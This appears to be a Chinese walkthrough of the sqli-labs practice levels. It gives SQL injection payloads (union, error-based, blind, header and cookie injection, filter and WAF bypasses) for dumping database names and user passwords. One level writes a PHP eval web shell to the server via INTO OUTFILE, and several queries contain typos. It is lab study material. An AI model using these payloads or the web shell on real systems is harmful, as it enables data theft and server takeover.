# SQL-lab
sql注入全部解析

## 1. 先看题，要求输入一个数字

* 入乡随俗，试一试

![image](https://user-images.githubusercontent.com/76896357/114820853-429a7f80-9df2-11eb-8e69-c9e68400ed5d.png)

__很显然，会有回显__

* 接下来自由发挥，再输入一个2试试，又变了

![image](https://user-images.githubusercontent.com/76896357/114821024-84c3c100-9df2-11eb-8834-2cd998dc279e.png)

* 接下来，接下来试一试他的闭合方式

![image](https://user-images.githubusercontent.com/76896357/114821235-d409f180-9df2-11eb-8fbe-c14697352895.png)

__添加完单引号，根据报错的回显，发现他是单引号闭合方式，并且是字符型注入__

* 再看一下有几列，看看有哪几列可以回显

![image](https://user-images.githubusercontent.com/76896357/114821673-80e46e80-9df3-11eb-9d21-9c59ca3d3226.png)

**在这里我输入了六列进行联合查询，但是显示没有六列，那么就截一半**

![image](https://user-images.githubusercontent.com/76896357/114821812-b4bf9400-9df3-11eb-9986-d1e0bb9349bc.png)

**根据回显，我们发现，第二列和第三列是可以回显的**

> 现在我们就可以查到我们想要的内容

#### 查询数据库版本和库名称
```
-1' union select 1,version,database() --+//要让前边为错“-1”，不让数据库执行前边的语句
```

![image](https://user-images.githubusercontent.com/76896357/114821977-f9e3c600-9df3-11eb-95ca-17e5b48cce94.png)

#### 查询表名
```
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+//group_concat,查询显示所有结果
```

![image](https://user-images.githubusercontent.com/76896357/114822963-690dea00-9df5-11eb-962c-c757254f70e4.png)

#### 查询列名
```
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=database() and table_name='users' --+
```

![image](https://user-images.githubusercontent.com/76896357/114823252-d6217f80-9df5-11eb-891e-32999a95568f.png)

#### 查询字段名
```
-1' union select 1,2,group_concat(password) from security.users --+
```

![image](https://user-images.githubusercontent.com/76896357/114823890-ad4dba00-9df6-11eb-85e1-6c065b1812ea.png)

第一关结束！！！


## 2. 数字型注入

* 查看下注入方式

![image](https://user-images.githubusercontent.com/76896357/114824492-8a6fd580-9df7-11eb-8d98-322e39c8b9b4.png)

很显然1没有被显示出来，那么就是数字型注入**那么不需要再数字的后面加上任何字符**

* 看下回显位

![image](https://user-images.githubusercontent.com/76896357/114825124-66f95a80-9df8-11eb-9679-eb91c77552e6.png)

* 查库
```
-1 union select 1,2,database() --+
```

![image](https://user-images.githubusercontent.com/76896357/114825614-07e81580-9df9-11eb-97f2-cc99c4a168ff.png)

从这里发现，之后的阶段和第一题几乎一样，除了1后面的‘。。。

不再赘述，下一题，

## 3.报错注入

* 查看注入方式
* ![image](https://user-images.githubusercontent.com/76896357/114825972-71682400-9df9-11eb-880f-b1b9def1e766.png)

在这里，可以看到，过滤的很严，看不出来是哪种方式闭合,但是可以发现，只有在输入‘的时候会报错，因此猜想是单引号的字符型注入

**然而当我再输入的时候查看回显位的时候，这才发现了他的闭合方式，原来是‘)**
```
-1') union select 1,2,3 --+
```
![image](https://user-images.githubusercontent.com/76896357/114826417-13880c00-9dfa-11eb-9720-a58460cfc5d2.png)

好了，现在知道闭合方式，那么继续查看回显

![image](https://user-images.githubusercontent.com/76896357/114826682-5cd85b80-9dfa-11eb-8aa5-8290364a0156.png)


剩下的步骤还是和第一关一样，只不过是把1‘换成1’)

![image](https://user-images.githubusercontent.com/76896357/114826920-a4f77e00-9dfa-11eb-9613-9d757b875fe4.png)

给个证明，不多做了

这一关过！！！！

## 4.”字符型注入

* 查看注入方式，输入1‘不行，1“报错

![image](https://user-images.githubusercontent.com/76896357/114827042-cb1d1e00-9dfa-11eb-82e8-3a47c7c01055.png)


根据报错显示这道题的闭合方式应该是“)

* 查询回显位
```
-1") union select 1,2,3 --+//前面一定要是错的
```

![image](https://user-images.githubusercontent.com/76896357/114827286-10d9e680-9dfb-11eb-9974-6690deabc7f8.png)

* 查库
```
-1") union select 1,2,database() --+
```

![image](https://user-images.githubusercontent.com/76896357/114827516-5d252680-9dfb-11eb-8f6d-1f136fe29b7d.png)

显然和第一关一样，不再赘述，过


## 5. 报错注入

* 在这里，继续查看他的闭合方式以及注入类型

```
-1' union select 1,2,3 --+
```

![image](https://user-images.githubusercontent.com/76896357/114827854-c442db00-9dfb-11eb-8a3d-c7972e860903.png)

通过报错发现，他的闭合方式是‘而且是字符型注入

* 查看他有没有回显
```
-1' union select 1,2,3 --+
```

![image](https://user-images.githubusercontent.com/76896357/114828080-0ff58480-9dfc-11eb-89f3-8165d4594b2c.png)

__完了，没有回显了，那么我们就想到报错注入__

```
-1' union select 1,2,3,4 --+
```

![image](https://user-images.githubusercontent.com/76896357/114828373-6662c300-9dfc-11eb-9b32-ac5d96f1faef.png)

__很显然他是会返回错误信息的__

因此套用报错注入的公式
```
?id=-1'union select count(*),1, concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a--+
```

![image](https://user-images.githubusercontent.com/76896357/114830420-c195b500-9dfe-11eb-9751-5910d2262d7e.png)

* 查表：
```
?id=-1'union select count(*),1, concat('~',(select table_name from information_schema.tables where table_schema=database() limit 3,1),'~',floor(rand()*2)) as a from information_schema.tables group by a --+//同时带有随机性
```
![image](https://user-images.githubusercontent.com/76896357/114836284-12101100-9e05-11eb-8a85-450af27666ee.png)

* 查列：
```
?id=-1' union select count(*),1, concat('~',(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 2,1),'~',floor(rand()*2)) as a from information_schema.tables group by a --+
```
![image](https://user-images.githubusercontent.com/76896357/114838451-4edd0780-9e07-11eb-8841-55c6c4a4e235.png)

* 查字段：
```
?id=-1' union select count(*),1, concat('~',(select password from security.users limit 1,1),'~',floor(rand()*2)) as a from information_schema.tables group by a --+
```

![image](https://user-images.githubusercontent.com/76896357/114838875-ba26d980-9e07-11eb-9917-1745abca7181.png)


**建议：背下公式，concat里面的内容是要修改的查询语句**//存在一定的概率问题，当出现YOU are in。。。时，多试几次

## 6. “报错注入

看到这就感觉和第五题应该差不多

* 查看他的闭合方式
```
?id=1') and 1=2 --+ //1=1时不会报错，1=2时报错
```
![image](https://user-images.githubusercontent.com/76896357/114840558-7fbe3c00-9e09-11eb-8126-f3ce73b2abfb.png)

可以看出他的闭合方式是双引号

* 其实在这里之前我先输如的是‘和” 发现’的时候会返回Yuo are in。。。“的时候发现没有回显，就可以知道他的闭合方式是”“

* 查库：
```
?id=-1'union select count(*),1, concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a--+
```
![image](https://user-images.githubusercontent.com/76896357/114841918-edb73300-9e0a-11eb-9f3c-ba9ec6ae63df.png)

很显然这道题和第五题一样,不再赘述！！


## 7. 文件输出

一开始有些无脑，直接试了？ID=1

![image](https://user-images.githubusercontent.com/76896357/114842556-88177680-9e0b-11eb-9a43-396a2761a6bd.png)

很显然这里是要导出文件

测试他的闭合方式

![image](https://user-images.githubusercontent.com/76896357/114844810-bdbd5f00-9e0d-11eb-8a0b-57aaa8b71ceb.png)

再加上一个‘)就可以了

![image](https://user-images.githubusercontent.com/76896357/114844888-d2015c00-9e0d-11eb-91c0-89d14b82a8b6.png)

所以，闭合方式是‘））

* 直接写入
```
?id=-1')) union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "D:\\phpstudy_pro\\WWW\\q.php" --+
```
注意是否有写入文件的权限

之后用菜刀等链接

## 8.布尔单引号盲注

* 经判断，没有回显

* 查看闭合方式
```
?id=1' and 1=1 --+
```
![image](https://user-images.githubusercontent.com/76896357/114853505-6ff92480-9e16-11eb-9d8a-5a3ad5e2362f.png)

确定是‘的闭合方式

* 判断是不是报错注入
```
?id=1' union select 1,2,3,4 --+
```

* 很显然不是，而是bool盲注，只显示两种情况

因此，就用猜测的方法

```
?id=1' and substr(database(),1,1)='s' --+
```
![image](https://user-images.githubusercontent.com/76896357/114865853-704cec00-9e25-11eb-91d1-a1c15fed4458.png)

这里可以借助bp，进行爆破

还可以手工
类似于：

这样：

![image](https://user-images.githubusercontent.com/76896357/114857032-64a7f800-9e1a-11eb-9c08-2ab04a3e08f3.png)

先猜出database()的长度

再利用ascii码一个一个去猜，一般是利用bp爆破，也可以直接爆破

* 查库


![image](https://user-images.githubusercontent.com/76896357/114870309-96c15600-9e2a-11eb-989a-15aa884f454b.png)

设置爆破词典

![image](https://user-images.githubusercontent.com/76896357/114870597-ef90ee80-9e2a-11eb-9146-ba6e353e1be1.png)

![image](https://user-images.githubusercontent.com/76896357/114870628-fae41a00-9e2a-11eb-89fd-3420e5e4f9bf.png)

直接可以爆破出来

![image](https://user-images.githubusercontent.com/76896357/114875833-46e58d80-9e30-11eb-9175-7dff2c4758b2.png)

由此可知，库名是security

* 查表：
```
?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' --+
```
![image](https://user-images.githubusercontent.com/76896357/114887359-f6bff880-9e3a-11eb-839c-1356d722d19c.png)

介绍一种方法:
利用bp，进行一字母一个字母爆破

![image](https://user-images.githubusercontent.com/76896357/114896206-b795a580-9e42-11eb-8bb7-c932b9fcb159.png)

* 查字段
```
?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 1,1),1)='p' --+
```
自己手动改变第一个1和第3个1，让bp去爆破字母

![image](https://user-images.githubusercontent.com/76896357/114899272-6804a900-9e45-11eb-81ce-139b06a793a3.png)

剩下的同理。。。过！！！


## 9.延时注入
* 查看其闭合方式

![image](https://user-images.githubusercontent.com/76896357/114900519-8323e880-9e46-11eb-882a-660c125bea0c.png)


* 发现无论输入什么，就只有那一句话，这就说明，没有回显，没有报错，不能布尔盲注

那么就只能，利用一下，绝招(绝境用的招数)，延时注入
```
?id=1' and sleep(5) --+
```
![image](https://user-images.githubusercontent.com/76896357/114900360-612a6600-9e46-11eb-90e3-bd246dea60c8.png)

还真睡了5秒

就这样，通过判断真假来让其睡眠

* 查库

判断库的长度
```
?id=1 and if(length(database())>5,sleep(3),1) --+
```

![image](https://user-images.githubusercontent.com/76896357/114902251-37723e80-9e48-11eb-928a-e3eb069b74a2.png)


之后在尝试找到8，利用bp也可以爆破

之后再构造left语句，查询每一位
```
?id=1' and if(left(database(),8)-'ssss',sleep(3),1)
```
只要时间够，利用bp是完全可以爆下来的
* 查表

```
?id=1' and if(left((select table_name from information_schema.tables where table_schame='sequrity' limit 1,1),1)='s', sleep(3), 1) --+
```

* 查列

```
?id=1' and if(left((select column_name from information_schema.columns where table_naem='users' limit 1,1),1)='a',sleep(3),1) --+

?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password', sleep(3), 1) --+//最终结果
```

* 查字段

```
?id=1' and if(left((select password from security.users limit 1,1),1)='p',sleep(3),1) --+

?id=1' and if(left((select password from users order by id limit 0,1),4)='dumb' , sleep(3), 1) --+//最后结果
```

由于每次都要手动换好几个数，可以利用sqlmap。。

## 10. 和9题类似，只有 单双引号的区别，不再赘述。。。

![image](https://user-images.githubusercontent.com/76896357/114960633-07ec2200-9e9a-11eb-8e7a-82cdf6ab5b48.png)

只有这种情况下睡眠3秒，因此猜测闭合方式是“。。

## 11. POST类型的注入

探水：

![image](https://user-images.githubusercontent.com/76896357/114960898-8ba60e80-9e9a-11eb-9f6c-881547ef14d6.png)

抓包来看一下

![image](https://user-images.githubusercontent.com/76896357/114962318-0f60fa80-9e9d-11eb-92d2-b93a8ff6982b.png)

这里之前输入了好多种情况，只有‘才会报错，那么估计闭合方式是‘，再看一下有没有回显

* 查看回显
```
uname=-admin' union select 1,2#&passwd=admin&submit=Submit
```

![image](https://user-images.githubusercontent.com/76896357/114963421-4c2df100-9e9f-11eb-9889-9096449b170b.png)

本来之前以为和前十一样，没想到。。。只有两列

**说明有回显**

* 查库
```
uname=-admin' union select database(),2#&passwd=admin&submit=Submit
```

* 查表
```
uname=-admin' union select 1,table_name from information_shema.tabes where table_schema=security #&passwd=admin&submit=Submit
```

![image](https://user-images.githubusercontent.com/76896357/114963822-26edb280-9ea0-11eb-9610-79564eb378f4.png)

* 查列
```
uname=-admin' union select database(),group_concat(column_name) from information_schema.columns where table_name='users'#&passwd=admin&submit=Submit
```
![image](https://user-images.githubusercontent.com/76896357/114964056-8c41a380-9ea0-11eb-8bdc-799356b8bdd6.png)

* 查字段

```
uname=-admin' union select database(),group_concat(password) from security.users #&passwd=admin&submit=Submit
```

![image](https://user-images.githubusercontent.com/76896357/114964198-d2970280-9ea0-11eb-8470-743c67459ece.png)

过了

## 12. POST双引号注入

根据之前的经验直接进行抓包

* 看看有没有报错

![image](https://user-images.githubusercontent.com/76896357/114964967-4a196180-9ea2-11eb-9bdf-46395f3b513b.png)

有报错，也许可以进行报错注入

* 查看闭合方式

![image](https://user-images.githubusercontent.com/76896357/114965197-b98f5100-9ea2-11eb-9251-046380f5712d.png)

是“）的闭合方式

* 试一试能不能联合查询

![image](https://user-images.githubusercontent.com/76896357/114965323-f2c7c100-9ea2-11eb-94a0-fb8bec808777.png)

很显然，有回显，那么和上一题几乎一样

#### 接下来试一下updatexml爆错注入

* 查库

```
uname=-admin") and updatexml(1,concat('^',(select database()),'^'),1)#&passwd=1&submit=Submi
```
![image](https://user-images.githubusercontent.com/76896357/114965654-96b16c80-9ea3-11eb-9b54-fef2caf8a761.png)

* 查询所有库
```
uname=-admin") and updatexml(1,concat('^',(select group_concat(database()) from information_schema.schemata),'^'),1)#&passwd=1&submit=Submi
```

![image](https://user-images.githubusercontent.com/76896357/114965789-e3954300-9ea3-11eb-8a88-e79a408c4b9a.png)

* 查表
```
uname=-admin") and updatexml(1,concat('^',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'^'),1)#&passwd=1&submit=Submi
```
![image](https://user-images.githubusercontent.com/76896357/114965919-28b97500-9ea4-11eb-933a-a52000908768.png)

* 查列

```
uname=-admin") and updatexml(1,concat('^',(select group_concat(column_name) from information_schema.columns where table_name='users'),'^'),1)#&passwd=1&submit=Submi
```

![image](https://user-images.githubusercontent.com/76896357/114966102-7d5cf000-9ea4-11eb-9655-261e870b9bd9.png)

注意这里没有全部显示出来，那么就用limit

```
uname=-admin") and updatexml(1,concat('^',(select column_name from information_schema.columns where table_name='users' limit 4,1),'^'),1)#&passwd=1&submit=Submi
```
因此，在这里发生了一点小插曲

![image](https://user-images.githubusercontent.com/76896357/114966500-40ddc400-9ea5-11eb-89c7-fadfd419038a.png)

* 查字段

```
uname=-admin") and updatexml(1,concat('^',(select group_concat(username,'~',password) from security.users),'^'),1)#&passwd=1&submit=Submi
```

这里仍然是查询不完整，再用上面的方法就好了

这一关也过了。。。


## 13. 单引号变形报错注入

* 代理抓包，送到repeater模块

* 看一下闭合方式
```
admin'//能看处什么方式闭合就行
```


* 根据报错，试一下报错注入
```
uname=admin') and updatexml(1,concat('^',(select database()),'^'),1)#&passwd=&submit=Submit
```
![image](https://user-images.githubusercontent.com/76896357/114978311-a5a41900-9ebb-11eb-9725-1f42c9b2b6e6.png)

注入成功

* 试一下能不能联合注入

![image](https://user-images.githubusercontent.com/76896357/114978625-0895b000-9ebc-11eb-87df-d60fee8e19b7.png)

很显然不能，那么，就直接用报错注入就好，和12题类似


## 14. POST型bool盲注

* 猜测闭合方式
```
admin" and 1=1 #
```
![image](https://user-images.githubusercontent.com/76896357/114979112-e3ee0800-9ebc-11eb-9b43-ecf0062f29a0.png)

从这里可以知道“为闭合方式

* 又因为无论输入什么都不会显示，那么只有延时注入，让他睡几秒

* 查库

![image](https://user-images.githubusercontent.com/76896357/114979462-7b535b00-9ebd-11eb-8675-4a8208c6fdec.png)

在这里，进行延时注入的时候发现他报错，有可能存在报错注入


延时注入可以爆破，

```
uname=admin" and updatexml(1,concat('^',(select database()),'^'),1) #&passwd=&submit=Submit 
```

![image](https://user-images.githubusercontent.com/76896357/114980178-ab4f2e00-9ebe-11eb-9cab-b77cb85d3992.png)

报错注入也可以

下面的就是换语句进行报错注入了，这一关，就先过了


## 15. 延时注入

* 尝试了，很多方式，没有回显，没有报错

只能用绝招(绝境用的招数)，延时注入，让他睡！！！

首先说一下，实在比较麻烦，最好用工具爆破，sqlmap更好

* 查看闭合方式：

![image](https://user-images.githubusercontent.com/76896357/114981202-34b33000-9ec0-11eb-9be2-1628936d4fef.png)

只有在__‘__的情况下，才会睡觉，呢么闭合方式就是__’__


* 查库

```
uname=admin' and if(substr(database(),§1§,1)='§s§',sleep(5),1)#&passwd=&submit=Submit//使用substr函数，利用bp爆破
```

![image](https://user-images.githubusercontent.com/76896357/114982063-8ad4a300-9ec1-11eb-8be4-ec232ce7a37c.png)

* 查表
```
uname=admin' and if(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),§1§,1)='§s§',sleep(5),1)#&passwd=&submit=Submit//这里我用的bp爆破，标记点也已经给出，但是只能爆出第一个，需要我们手动改一下limit，后面的那个值
```

![image](https://user-images.githubusercontent.com/76896357/114982545-2ebe4e80-9ec2-11eb-89c4-9d9233c74629.png)

下面这个就查到了user表！！！

![image](https://user-images.githubusercontent.com/76896357/114982884-8f4d8b80-9ec2-11eb-8f41-c2d52500db0f.png)

* 查列
```
uname=admin' and if(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),§1§,1)='§s§',sleep(5),1)#&passwd=&submit=Submit
```
查到user列

![image](https://user-images.githubusercontent.com/76896357/114983249-f4a17c80-9ec2-11eb-9e7b-5fcc41552187.png)

查到password列

![image](https://user-images.githubusercontent.com/76896357/114983399-287ca200-9ec3-11eb-8f8a-7b4b1c61e3c5.png)

利用substr函数切割进行查询，还是很快的

* 查字段
```
uname=admin' and if(substr((select password from security.users limit 4,1),§1§,1)='§s§',sleep(5),1)#&passwd=&submit=Submit
```
![image](https://user-images.githubusercontent.com/76896357/114983971-cec8a780-9ec3-11eb-99f8-79e51f9d9d76.png)

## 16. 双引号延时注入

现在本页面看看，是什么样的类型注入，以及他的闭合方式，发现啥也不显示。。。。。。

完犊子了，又是延时，吐了，看一下，闭合方式吧

差点没试出来
```
admin") and if(1=1,sleep(3),1) #
```
![image](https://user-images.githubusercontent.com/76896357/114986199-4a2b5880-9ec6-11eb-8f82-4eaee69b0140.png)

剩下的就是类似15题吧


## 17. 基于错误的更新查询

**这种情况，一下子给我整懵了，最后就参考别人博客写了一下**

https://blog.csdn.net/qq_41420747/article/details/81836327

那么就针对password搞一下吧

* 查找闭合方式

![image](https://user-images.githubusercontent.com/76896357/114987969-5fa18200-9ec8-11eb-88cd-6a4d73a01074.png)

* 由于报错，那么执行一下报错注入吧

* 查库
```
uname=admin&passwd=admin' and updatexml(1,concat('^',database(),'^'),1) #&submit=Submit
```

![image](https://user-images.githubusercontent.com/76896357/114988290-be66fb80-9ec8-11eb-9e62-a09e39a637f3.png)


额。。。说实话这道题kennel是我的原因，报出来的全是admin，还是看上面的博客吧

## 18. 用户代理头部注入

![image](https://user-images.githubusercontent.com/76896357/114988631-20bffc00-9ec9-11eb-8ced-89ba77c7baa9.png)

看见这样的界面，看见ip，直接抓包
 
 额。。。
 
看下源代码吧

![image](https://user-images.githubusercontent.com/76896357/115002111-f2e1b400-9ed6-11eb-8f03-30d01086de1c.png)

用户名和密码都做了检查，但是他除了ip还接受了user-agent

![image](https://user-images.githubusercontent.com/76896357/115002470-5d92ef80-9ed7-11eb-990f-3f936691b39c.png)

查询语句中存在uagent，那么考虑再user-gent中注入

* 查库：
```
User-Agent: 'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '//下面千万要把账号密码带上，不然程序走的是另一条路线
```
![image](https://user-images.githubusercontent.com/76896357/115007886-10b21780-9edd-11eb-9be8-b350f5c54846.png)

接下来就是🧐构造语句了

## 19. refer头注入

和18题类似，过。。。

## 20. cookie注入

输入正确的用户名密码后，看到如下界面

![image](https://user-images.githubusercontent.com/76896357/115010624-35f45500-9ee0-11eb-8824-028699905a1d.png)

那么就想到cookie了，抓包看一下

![image](https://user-images.githubusercontent.com/76896357/115010717-4f959c80-9ee0-11eb-8dd5-7bb9a527115d.png)

* 查看闭合方式

![image](https://user-images.githubusercontent.com/76896357/115011707-89b36e00-9ee1-11eb-99d0-c256a4f0b869.png)

* 看下有没有回显

![image](https://user-images.githubusercontent.com/76896357/115011235-fc701980-9ee0-11eb-91c6-dc9d0065d4a9.png)

有回显

* 查库

![image](https://user-images.githubusercontent.com/76896357/115011199-efebc100-9ee0-11eb-847e-f4e8c1700402.png)

可以注入

接下来就是在回显的位置构造sql语句了，不再赘述

## 21. 复杂的字符型注入

继续抓包看一下，发的是啥

![image](https://user-images.githubusercontent.com/76896357/115012050-edd63200-9ee1-11eb-9dd2-3b1aba96f72d.png)

一开始以为啥也没有，放了几个包后，发现那个玩意。。。。
意味深长。。。试一下

当然首先是要解密 %3D是=，猜想是base64
![image](https://user-images.githubusercontent.com/76896357/115012443-6ccb6a80-9ee2-11eb-8689-519cfba43cd8.png)

nice

在加密那里构造语句，加密后放进cookie里面

* 查看闭合方式

![image](https://user-images.githubusercontent.com/76896357/115012854-e4999500-9ee2-11eb-91e7-a0eb02d88838.png)

* 查看有没有回显

```
-admin') union select 1,2,3 #//利用#来注释
```
编译后的密文

![image](https://user-images.githubusercontent.com/76896357/115013185-51ad2a80-9ee3-11eb-8b51-6ecf9801d7e4.png)

可以查到回显位

![image](https://user-images.githubusercontent.com/76896357/115013229-5a9dfc00-9ee3-11eb-9391-63e0be6302a0.png)

接下来，根据那条语句，构造sql语句就可以了，再把语句构造成base64密文，复制到cookie那里

## 22. 基于错误的双引号注入

继续抓包看一下

![image](https://user-images.githubusercontent.com/76896357/115098719-1e5eb000-9f64-11eb-9aa4-685fc509e6c2.png)

还是cookie注入

* 查看闭合方式
```
-admin"
```
![image](https://user-images.githubusercontent.com/76896357/115098782-857c6480-9f64-11eb-851e-3be941b5d54d.png)

根据报错说明是“”
![image](https://user-images.githubusercontent.com/76896357/115098777-7e555680-9f64-11eb-8deb-dde277dfb4d7.png)

* 查看有没有回显
```
-admin" union select 1,2,3 #
```
![image](https://user-images.githubusercontent.com/76896357/115098829-d1c7a480-9f64-11eb-8475-1445288586fa.png)

* 查库
```
-admin" union select 1,2,database() #//加密
```
![image](https://user-images.githubusercontent.com/76896357/115098863-09cee780-9f65-11eb-9b85-fdfc374be5ee.png)

* 查表
```
-admin" union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
```

![image](https://user-images.githubusercontent.com/76896357/115098921-5d413580-9f65-11eb-8372-ed7eb6ca17c4.png)

![image](https://user-images.githubusercontent.com/76896357/115098749-4fd77b80-9f64-11eb-808a-874b63b532f8.png)

剩下的就类似之前的语句

## 23. 过滤掉注释

* 看一下闭合方式
```
?id=admin'
```

![image](https://user-images.githubusercontent.com/76896357/115099006-e2c4e580-9f65-11eb-83d9-1ad8feb18c50.png)

显然是‘闭合

* 看下有没有回显
```
?id=admin' union select 1,2,3 --+
```
![image](https://user-images.githubusercontent.com/76896357/115099050-16a00b00-9f66-11eb-96b0-5fb40f2eaf43.png)

没有

* 看下会不会报错

```
?id=1' and 1=1 --+
```

![image](https://user-images.githubusercontent.com/76896357/115099104-5e269700-9f66-11eb-9ff3-845c0eac76bc.png)

看到这里，发现报错就没变过，而且根据报错也能猜到，估计是把注释给过滤掉了。。。

那么就有自己来造闭合语句‘’

* 查库
```
?id='union select 1,2,3'
?id='union select 1,2,databae()'

?id= ' union select 1,2,group_concat(database()) from information_schema.schemata where 1 or '1'= '
```
![image](https://user-images.githubusercontent.com/76896357/115099163-b9f12000-9f66-11eb-96be-e19b2e1e4739.png)

全部的数据库

![image](https://user-images.githubusercontent.com/76896357/115099205-f3299000-9f66-11eb-8a88-cbce1f8c2225.png)

* 查表

```
?id=' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or '1'= '
```

![image](https://user-images.githubusercontent.com/76896357/115099249-51ef0980-9f67-11eb-99da-5b74bcff9ab5.png)

* 查列

```
?id=' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' or '1'= '
```

![image](https://user-images.githubusercontent.com/76896357/115099310-b4e0a080-9f67-11eb-887f-ba54aa6ffb57.png)

* 查字段

```
?id='union select 1,group_concat(username),group_concat(password) from security.users where 1 or '1'= '//把句子结构补全不然不让过
```

![image](https://user-images.githubusercontent.com/76896357/115099371-0557fe00-9f68-11eb-8652-629a221ff6c8.png)

过。。。。

## 24. 出了点问题先跳过

## 25. AND和or被绕过

* 看一下闭合方式



显然是‘闭合

* 看下有没有回显
```
?id=-1' union select 1,2,3 --+
```

![image](https://user-images.githubusercontent.com/76896357/115099670-fe31ef80-9f69-11eb-8863-c204037a3fa8.png)

还是有回显的

* 查库

```
?id=-1' union select 1,2,database() --+
```

![image](https://user-images.githubusercontent.com/76896357/115099671-fe31ef80-9f69-11eb-9513-73448e37a1c4.png)

* 查表
```
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
?id=-1' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+
```

![image](https://user-images.githubusercontent.com/76896357/115099731-608af000-9f6a-11eb-868f-118da39c30a4.png)

看这就出毛病了

but,双写一下就好了啊

![image](https://user-images.githubusercontent.com/76896357/115099753-94feac00-9f6a-11eb-8a5b-d29a203728c0.png)

加个group_concat完美些

![image](https://user-images.githubusercontent.com/76896357/115099813-faeb3380-9f6a-11eb-8e8a-aa9f13a41d67.png)

同样，构建password的时候也要写成passwoorrd

这里就不介绍了。。。

## 26. 过滤一堆的注入

* 查询闭合方式
```
?id=1' and 1=1 --+
```
![image](https://user-images.githubusercontent.com/76896357/115099874-6208e800-9f6b-11eb-825f-cf35a471ba8f.png)

显然是‘闭合

* 查看又没有回显

![image](https://user-images.githubusercontent.com/76896357/115099911-abf1ce00-9f6b-11eb-9dd6-c4b4949809e5.png)

没有回显，根据提示也能知道

* 看看有没有报错

```
id=1' anandd 1=2 -- 
```

![image](https://user-images.githubusercontent.com/76896357/115099935-d3e13180-9f6b-11eb-9f42-5762b727f1cf.png)

好家伙不仅没有报错，还把and和or过滤了

![image](https://user-images.githubusercontent.com/76896357/115100004-5833b480-9f6c-11eb-9bc1-b6cdab9881a4.png)

实在看不出来了，来代码审计吧

![image](https://user-images.githubusercontent.com/76896357/115100036-90d38e00-9f6c-11eb-86ae-6b2d06be3ae6.png)

好家伙，用了正则，过滤了这么多 or，and ，#，--，/*，/都没了，这里为什么要过滤/*，，，这家伙是多行注释，常用/**/来代替空格


%a0    空格

%09    tab

还有其他方式
```
?id=1'%09||'1
```
![image](https://user-images.githubusercontent.com/76896357/115100349-9f22a980-9f6e-11eb-90a8-276c65e946c6.png)

* 查看闭合方式



由于输入什么都不显示,延时都不行，此案过。。。


## 27. 过滤union和select的注入

* 查看闭合方式
```
?id=1'
```
![image](https://user-images.githubusercontent.com/76896357/115102138-b025e780-9f7b-11eb-84e4-cf9d26b54d23.png)

单引号闭合

* 查看是否有回显(不能用union)

代码审计，看下他过滤掉了哪些

![image](https://user-images.githubusercontent.com/76896357/115102277-76a1ac00-9f7c-11eb-9f52-579801e6b701.png)

又是一堆正则。。。。。。
* 查看回显
```
?id=0'%0AUNion%0ASeleCt%0A1,2,3%0Aor%0A'1'= '//最好别用hackbar，会出现问题的
```
![image](https://user-images.githubusercontent.com/76896357/115107358-0a837000-9f9d-11eb-8870-4b6940bb1dfa.png)

剩下的就类似这样直接查。。。

## 26,27,28..都是过滤union，select可i用大小写绕过，空格用%a0补充


## 29. waf保护

* 看看有没有回显

```
?id=-1' union select 1,2,3 --+
```

![image](https://user-images.githubusercontent.com/76896357/115104963-ac4f9080-9f8e-11eb-8055-55137a6d224f.png)


有回显，查库

```
?id=-1' union select 1,2,database() --+
```
![image](https://user-images.githubusercontent.com/76896357/115105020-dc972f00-9f8e-11eb-9ad8-bbd58b258a10.png)

* 查表

![image](https://user-images.githubusercontent.com/76896357/115105154-aad29800-9f8f-11eb-9e98-382bd4cd164c.png)

* 查列

![image](https://user-images.githubusercontent.com/76896357/115105286-8e832b00-9f90-11eb-9e8c-987c7c99d821.png)


* 查字段

![image](https://user-images.githubusercontent.com/76896357/115105279-81fed280-9f90-11eb-8cfa-6f26b93fd36b.png)

想了解waf可以去专门了解一下

## 30. get——blind waf

![image](https://user-images.githubusercontent.com/76896357/115105461-b030e200-9f91-11eb-9ce5-bd577456cc69.png)

果然和上一题一样有点水

* 查表

![image](https://user-images.githubusercontent.com/76896357/115105488-e8d0bb80-9f91-11eb-98ef-7e0380854daf.png)

* 查字段

![image](https://user-images.githubusercontent.com/76896357/115105531-203f6800-9f92-11eb-80df-a544bbad595d.png)

好家伙这里就不行了，看样子并不是很水
```
?id=1&id=-1" union select 1,2,group_concat(password) from security.users --+
```

![image](https://user-images.githubusercontent.com/76896357/115107513-e07e7d80-9f9d-11eb-9453-dc87e892482a.png)


## 31. waf

* 看一下闭合方式

![image](https://user-images.githubusercontent.com/76896357/115106645-9c3cae80-9f98-11eb-925f-3f272c7b3f56.png)

* 查看有没有回显

![image](https://user-images.githubusercontent.com/76896357/115106727-ed4ca280-9f98-11eb-8d47-f63124df0489.png)

可以根据回显看处数据库

* 查看数据表

![image](https://user-images.githubusercontent.com/76896357/115106769-2422b880-9f99-11eb-8782-ce56d2305bd6.png)

* 查看字段

![image](https://user-images.githubusercontent.com/76896357/115106810-5cc29200-9f99-11eb-928c-49538fa42fd2.png)

* 查询字段内容

![image](https://user-images.githubusercontent.com/76896357/115106835-7fed4180-9f99-11eb-8fff-f69642be1310.png)

## 32. 宽字节注入

将/进行url转码，再配合另一个比如%ee合在一起转换成gbk字符，把/吃掉

* 查看是否有回显

```
?id=-1%ee' union select 1,2,3 --+
```
![image](https://user-images.githubusercontent.com/76896357/115107087-4fa6a280-9f9b-11eb-8a2c-b78c0b2c3e86.png)

* 查库

```
?id=-1%ee' union select 1,2,3 --+
```

